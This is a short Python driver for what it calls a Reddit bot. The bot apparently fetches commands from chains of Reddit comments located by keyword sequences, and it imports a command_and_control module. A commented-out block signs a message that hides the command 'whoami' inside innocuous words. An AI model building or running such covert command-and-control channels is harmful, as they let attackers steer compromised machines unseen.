import bot
import time

import command_and_control

if __name__ == '__main__':
    # run the Reddit bot
    bootstap = ["harrypotter","art","water","lilly"]
    demo = bot.Bot(bootstap)
    timeToSleep = 0
    status, next_keys = demo.GetNextCommand("harrypotter","art","water","lilly") #demo.start()
    print(f'status {status}, next keys {next_keys}')
    print("from go back: ", demo.GoBack())

    # while True:
    #     if status == 1:  # found next keys
    #         status, next_keys = demo.GetNextCommand(next_keys[0], next_keys[1], next_keys[2], next_keys[3])
    #
    #     if status == 2:  # next keys don't exist [end of path]
    #         time.sleep(10 * 60)
    #         status, next_keys = demo.GetNextCommand(next_keys[0], next_keys[1], next_keys[2], next_keys[3])
    #
    #     if status == 3:  # didn't find a comment with the given keys [path corrupted]
    #         status, next_keys =  demo.GoBack()
    #         print(status , next_keys)
    #     time.sleep(timeToSleep)



#     ######### sign a message - no new lines! like this: #########
#     msg = """I believe in them!
# 😍rp*whoami
# fairy fox dream
# cats diamond snail river"""
#     x = command_and_control.CommandAndControl()
#     sig = x.createSignature(msg)
#     print(sig)




